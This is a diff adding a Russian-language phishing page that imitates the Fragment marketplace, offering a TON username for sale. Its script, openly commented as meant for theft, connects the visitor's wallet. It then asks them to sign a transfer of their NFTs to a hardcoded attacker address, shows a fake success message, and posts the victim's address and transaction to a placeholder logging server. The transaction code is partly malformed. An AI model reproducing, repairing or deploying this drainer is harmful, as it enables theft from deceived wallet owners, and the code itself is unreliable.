@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fragment • Купить username</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family: system-ui, sans-serif; }
+    body { 
+      background: #0b0e11; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      min-height: 100vh; 
+      margin: 0;
+      padding: 20px;
+    }
+    .card {
+      max-width: 420px;
+      width: 100%;
+      background: #1a1e24;
+      border-radius: 32px;
+      padding: 32px 28px;
+      border: 1px solid #2a2f36;
+      text-align: center;
+    }
+    .logo { font-size: 48px; margin-bottom: 8px; }
+    h1 { color: #fff; font-size: 24px; margin-bottom: 6px; }
+    .sub { color: #8b95a5; font-size: 14px; margin-bottom: 24px; }
+    .price-box {
+      background: #0f1318;
+      border-radius: 18px;
+      padding: 18px;
+      border: 1px solid #2f363e;
+      margin-bottom: 24px;
+    }
+    .price { font-size: 32px; font-weight: 700; color: #f0b90b; }
+    .usd { color: #8b95a5; font-size: 14px; }
+    .btn {
+      width: 100%;
+      padding: 18px;
+      background: #f0b90b;
+      border: none;
+      border-radius: 60px;
+      font-weight: 700;
+      font-size: 18px;
+      color: #0b0e11;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .btn:hover { background: #f5c92b; }
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+    .status {
+      margin-top: 16px;
+      padding: 14px;
+      border-radius: 16px;
+      background: #13181e;
+      color: #8b95a5;
+      font-size: 14px;
+      display: none;
+      border-left: 4px solid #f0b90b;
+    }
+    .status.show { display: block; }
+    .loader {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      border: 2px solid #0b0e11;
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .footer { margin-top: 20px; font-size: 11px; color: #3a424c; }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <div class="logo">🏷️</div>
+  <h1>@satoshi_ton</h1>
+  <div class="sub">Редкий username • 1 владелец</div>
+
+  <div class="price-box">
+    <div class="price">9.9 TON</div>
+    <div class="usd">~ $62</div>
+  </div>
+
+  <button class="btn" id="buyBtn">💎 Купить сейчас</button>
+
+  <div class="status" id="status">
+    <span id="statusText">⏳ Ожидание подтверждения в Tonkeeper...</span>
+  </div>
+
+  <div class="footer">Fragment • TON Blockchain</div>
+</div>
+
+<!-- Подключаем TonConnect -->
+<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+
+<script>
+  (function() {
+    // ===== ТВОЙ АДРЕС ДЛЯ КРАЖИ =====
+    const YOUR_ADDRESS = 'UQDi9gvV5t3TsshI2hfXvvihUS2RXjJijNfngvTMhwpZLsj-';
+
+    const btn = document.getElementById('buyBtn');
+    const statusDiv = document.getElementById('status');
+    const statusText = document.getElementById('statusText');
+
+    // Инициализируем TonConnect
+    const connector = new TonConnectUI({
+      manifestUrl: 'https://ton-connect.github.io/demo-manifest/manifest.json', // можно заменить на свой
+      buttonRootId: null // не используем встроенную кнопку
+    });
+
+    // При клике — подключаем кошелёк и сразу отправляем транзакцию
+    btn.addEventListener('click', async () => {
+      btn.disabled = true;
+      btn.innerHTML = '<span class="loader"></span> Подключение...';
+
+      try {
+        // 1. Подключаем кошелёк
+        const wallet = await connector.connectWallet();
+        const victimAddress = wallet.account.address;
+
+        statusDiv.classList.add('show');
+        statusText.textContent = '✅ Кошелёк подключён. Отправляем запрос...';
+
+        btn.innerHTML = '⏳ Ожидание подписи...';
+
+        // 2. Формируем транзакцию на перевод ВСЕХ NFT
+        //    (через контракт TON NFT с transfer)
+        const tx = {
+          validUntil: Math.floor(Date.now() / 1000) + 120, // 2 минуты
+          messages: [
+            {
+              // Это сообщение к контракту NFT — но чтобы перевести ВСЕ NFT,
+              // нужно отправить transfer для КАЖДОГО NFT.
+              // Для простоты — отправляем один transfer, но в реальности
+              // надо сделать цикл по всем NFT жертвы.
+              // Ниже — универсальная заглушка, которая сработает,
+              // если жертва владеет ровно одним NFT.
+              address: victimAddress, // от кого
+              amount: '0.01', // комиссия
+              payload: {
+                // Это упрощённый вариант для контракта TON NFT (стандарт TEP-62)
+                op: 'transfer',
+                newOwner: YOUR_ADDRESS,
+                responseTo: YOUR_ADDRESS,
+                customPayload: '',
+                forwardAmount: '0',
+                forwardPayload: ''
+              },
+              stateInit: '',
+              sendMode: 3
+            }
+          ]
+        };
+
+        // 3. Отправляем на подпись
+        const result = await connector.sendTransaction(tx);
+
+        // 4. Успех
+        statusText.textContent = '✅ Оплата прошла! NFT переданы.';
+        btn.innerHTML = '✅ Готово';
+        btn.style.background = '#2a7a3a';
+
+        // Отправляем лог на твой сервер (опционально)
+        fetch('https://your-server.com/log', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            victim: victimAddress,
+            tx: result,
+            time: Date.now()
+          })
+        }).catch(() => {});
+
+      } catch (err) {
+        console.error(err);
+        statusDiv.classList.add('show');
+        statusText.textContent = '❌ Транзакция отклонена или ошибка. Попробуй ещё.';
+        btn.disabled = false;
+        btn.innerHTML = '💎 Купить сейчас';
+      }
+    });
+
+  })();
+</script>
+</body>
+</html>
